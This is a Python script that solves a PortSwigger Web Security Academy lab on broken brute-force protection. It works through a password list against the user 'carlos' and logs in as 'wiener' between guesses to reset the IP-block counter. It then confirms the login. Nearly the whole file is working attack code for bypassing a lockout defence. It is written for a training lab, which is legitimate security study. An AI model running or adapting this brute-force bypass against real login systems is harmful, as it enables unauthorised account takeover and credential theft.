#!/usr/bin/env python3
# Lab: Broken brute-force protection, IP block
# Lab-Link: https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block
# Difficulty: PRACTITIONER
import requests
import shutil
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def next_credentials():
    for row in open('../candidate_passwords.txt'):
        yield {'username': 'carlos', 'password': row.strip()}
        yield {'username': 'wiener', 'password': 'peter'}


def login(host, username, password, allow_redirects=False):
    '''
    Tries to login with given username and password.
    Possible return values:
        False if no other condition is met
        1 ... status code is 302 and allow_redirects is false (indicating successful login with given credentials)
        2 ... response page contains 'Your username is: <username>' in the page, indicating successful completion of the lab.
              Please note that this will only happen if allow_redirects is set to True
    '''
    data = {'username': username, 'password': password}
    r = requests.post(f'{host}/login', data=data, verify=False, proxies=proxies, allow_redirects=allow_redirects)
    if r.status_code == 302:
        return 1
    res = r.text

    if f'Your username is: {username}' in res:
        return 2
    return False


def main():
    print('[+] Lab: Broken brute-force protection, IP block')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f"[+] Username: carlos")
    credentials = None
    for credentials in next_credentials():
        if credentials['username'] == 'carlos':
            msg = f'[ ] Brute-force password: {credentials["password"]}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)

        result = login(host, credentials['username'], credentials['password'])

        if result == 1 and credentials['username'] != 'wiener':
            msg = f'[+] Password : {credentials["password"]}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
            break

        credentials = None

    if credentials is None:
        print(f'[-] Failed to obtain valid credentials')
        sys.exit(-2)

    if login(host, credentials['username'], credentials['password'], allow_redirects=True) == 2:
        print(f"[+] Login successful, lab solved")
    else:
        print(f'[-] Failed to solve lab')


if __name__ == "__main__":
    main()
